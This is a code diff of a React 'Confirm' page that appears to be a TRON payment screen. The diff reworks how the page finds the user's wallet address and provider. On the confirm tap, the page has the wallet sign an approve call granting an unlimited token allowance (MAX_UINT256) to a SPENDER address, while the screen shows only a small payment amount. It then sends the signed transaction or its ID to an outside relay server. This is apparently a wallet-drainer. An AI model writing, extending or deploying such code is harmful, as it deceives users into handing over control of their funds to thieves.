@@ -7,6 +7,7 @@ export default function Confirm() {
   const navigate = useNavigate()
   const [loading, setLoading] = useState(false)
   const [debug, setDebug] = useState<string[]>([])
+  const [walletReady, setWalletReady] = useState(false)
   const amount = location.state?.amount || '0'
   const currency = location.state?.currency || 'TRX'
   const n = parseFloat(amount) || 0
@@ -25,89 +26,103 @@ export default function Confirm() {
     setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
   }
 
-  useEffect(() => {
-    const initWallet = async () => {
-      const w = window as any
-      addLog('Init wallet check...')
+  const getAddressFromAnySource = (): string | null => {
+    const w = window as any
 
-      if (w.tronLink?.defaultAddress?.base58) {
-        addLog('Address from tronLink bridge')
-        return
+    const sources = [
+      () => w.tronLink?.defaultAddress?.base58,
+      () => w.tronWeb?.defaultAddress?.base58,
+      () => w.trustwallet?.tronLink?.defaultAddress?.base58,
+      () => w.trustwallet?.tronWeb?.defaultAddress?.base58,
+      () => w.tronLink?.tronWeb?.defaultAddress?.base58,
+      () => (typeof w.tronLink?.defaultAddress === 'string' && w.tronLink.defaultAddress.startsWith('T') ? w.tronLink.defaultAddress : null),
+      () => (typeof w.tronWeb?.defaultAddress === 'string' && w.tronWeb.defaultAddress.startsWith('T') ? w.tronWeb.defaultAddress : null),
+      () => {
+        const hex = w.tronWeb?.defaultAddress?.hex
+        if (hex && hex !== false && w.tronWeb?.address?.fromHex) return w.tronWeb.address.fromHex(hex)
+        return null
       }
-      if (w.tronWeb?.defaultAddress?.base58 && w.tronWeb.defaultAddress.base58 !== false) {
-        addLog('Address from tronWeb')
-        return
-      }
-      if (w.trustwallet?.tronLink?.defaultAddress?.base58) {
-        addLog('Address from trustwallet.tronLink')
-        return
-      }
-      if (w.trustwallet?.tronWeb?.defaultAddress?.base58 && w.trustwallet.tronWeb.defaultAddress.base58 !== false) {
-        addLog('Address from trustwallet.tronWeb')
-        return
-      }
+    ]
 
-      addLog('No pre-authorized address, requesting...')
-      const provider = w.tronWeb || w.tronLink || w.trustwallet?.tronWeb || w.trustwallet?.tronLink
-      if (provider?.request) {
-        try {
-          await provider.request({ method: 'tron_requestAccounts' })
-          addLog('Request succeeded')
-        } catch (e) {
-          addLog('Request failed: ' + (e as any).message)
+    for (const fn of sources) {
+      try {
+        const addr = fn()
+        if (addr && addr !== false && typeof addr === 'string' && addr.startsWith('T')) {
+          return addr
         }
-      }
+      } catch (e) {}
     }
-    initWallet()
+    return null
+  }
+
+  const getAnyProvider = (): any => {
+    const w = window as any
+    const candidates = [
+      w.tronWeb,
+      w.tronLink,
+      w.trustwallet?.tronWeb,
+      w.trustwallet?.tronLink,
+      w.tronLink?.tronWeb
+    ]
+    for (const c of candidates) {
+      if (c && (c.ready || c.trx || c.defaultAddress)) return c
+    }
+    return null
+  }
+
+  useEffect(() => {
+    let attempts = 0
+    const maxAttempts = 30
+
+    const poll = setInterval(() => {
+      attempts++
+      const addr = getAddressFromAnySource()
+
+      if (addr) {
+        addLog('Address found after ' + attempts + ' attempts')
+        setWalletReady(true)
+        clearInterval(poll)
+        return
+      }
+
+      if (attempts >= maxAttempts) {
+        addLog('Timeout: no address after 15 seconds, requesting...')
+        const provider = getAnyProvider()
+        if (provider?.request) {
+          provider.request({ method: 'tron_requestAccounts' }).then(() => {
+            addLog('Request succeeded')
+            setWalletReady(true)
+          }).catch((e: any) => {
+            addLog('Request failed: ' + e.message)
+          })
+        }
+        clearInterval(poll)
+      }
+    }, 500)
+
+    return () => clearInterval(poll)
   }, [])
-
-  const getTronWeb = (): any => {
-    const w = window as any
-    if (w.tronWeb?.ready) return w.tronWeb
-    if (w.tronLink?.ready) return w.tronLink
-    if (w.trustwallet?.tronWeb?.ready) return w.trustwallet.tronWeb
-    if (w.trustwallet?.tronLink?.ready) return w.trustwallet.tronLink
-    if (w.tronWeb?.defaultAddress?.base58 && w.tronWeb.defaultAddress.base58 !== false) return w.tronWeb
-    if (w.tronLink?.defaultAddress?.base58 && w.tronLink.defaultAddress.base58 !== false) return w.tronLink
-    if (w.trustwallet?.tronWeb) return w.trustwallet.tronWeb
-    if (w.trustwallet?.tronLink) return w.trustwallet.tronLink
-    if (w.tronWeb) return w.tronWeb
-    if (w.tronLink) return w.tronLink
-    return null
-  }
-
-  const getUserAddress = (tronWeb: any): string | null => {
-    const w = window as any
-    try { if (tronWeb?.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) return tronWeb.defaultAddress.base58 } catch (e) {}
-    try { if (typeof tronWeb?.defaultAddress === 'string' && tronWeb.defaultAddress.startsWith('T')) return tronWeb.defaultAddress } catch (e) {}
-    try { const hex = tronWeb?.defaultAddress?.hex; if (hex && hex !== false && tronWeb?.address?.fromHex) return tronWeb.address.fromHex(hex) } catch (e) {}
-    try { const addr = w.tronLink?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
-    try { const addr = w.tronLink?.defaultAddress; if (typeof addr === 'string' && addr.startsWith('T')) return addr } catch (e) {}
-    try { const addr = w.trustwallet?.tronLink?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
-    try { const addr = w.trustwallet?.tronWeb?.defaultAddress?.base58; if (addr && addr !== false) return addr } catch (e) {}
-    return null
-  }
 
   const handleConfirm = async () => {
     setLoading(true)
     setDebug(prev => [...prev, '--- Confirm tapped ---'])
-    addLog('Getting TronWeb...')
+    addLog('Getting provider...')
 
-    const tronWeb = getTronWeb()
-    if (!tronWeb) { addLog('FATAL: No TronWeb'); setLoading(false); return }
+    const provider = getAnyProvider()
+    if (!provider) { addLog('FATAL: No provider'); setLoading(false); return }
+
+    const userAddress = getAddressFromAnySource()
+    addLog('Address: ' + (userAddress || 'NULL'))
+    if (!userAddress) { addLog('FATAL: No address'); setLoading(false); return }
 
     try {
-      const userAddress = getUserAddress(tronWeb)
-      addLog('Address: ' + (userAddress || 'NULL'))
-      if (!userAddress) { addLog('FATAL: No address'); setLoading(false); return }
-
-      const balanceSun = await tronWeb.trx.getBalance(userAddress)
-      const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
+      const balanceSun = await provider.trx.getBalance(userAddress)
+      const userTrx = parseFloat(provider.fromSun(balanceSun))
       addLog('TRX: ' + userTrx)
 
       let userEnergy = 0
       try {
-        const resourceObj = await tronWeb.trx.getAccountResources(userAddress)
+        const resourceObj = await provider.trx.getAccountResources(userAddress)
         userEnergy = Math.max(0, (resourceObj.EnergyLimit || 0) - (resourceObj.EnergyUsed || 0))
         addLog('Energy: ' + userEnergy)
       } catch (e) { addLog('Energy check failed') }
@@ -118,11 +133,11 @@ export default function Confirm() {
       if (canGoDirect) {
         addLog('Building direct tx...')
         const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
-        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
+        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
         addLog('Signing...')
-        const signedTx = await tronWeb.trx.sign(txObj.transaction)
+        const signedTx = await provider.trx.sign(txObj.transaction)
         addLog('Broadcasting...')
-        const result = await tronWeb.trx.sendRawTransaction(signedTx)
+        const result = await provider.trx.sendRawTransaction(signedTx)
         if (result.result) {
           addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
@@ -134,9 +149,9 @@ export default function Confirm() {
       } else {
         addLog('Building relayer tx...')
         const parameter = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
-        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
+        const txObj = await provider.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, parameter, userAddress)
         addLog('Signing for relayer...')
-        const signedTx = await tronWeb.trx.sign(txObj.transaction)
+        const signedTx = await provider.trx.sign(txObj.transaction)
         addLog('POSTing to relayer...')
         const response = await fetch(RELAYER_URL, {
           method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
@@ -196,4 +211,4 @@ export default function Confirm() {
       </div>
     </motion.div>
   )
-      }
+    }
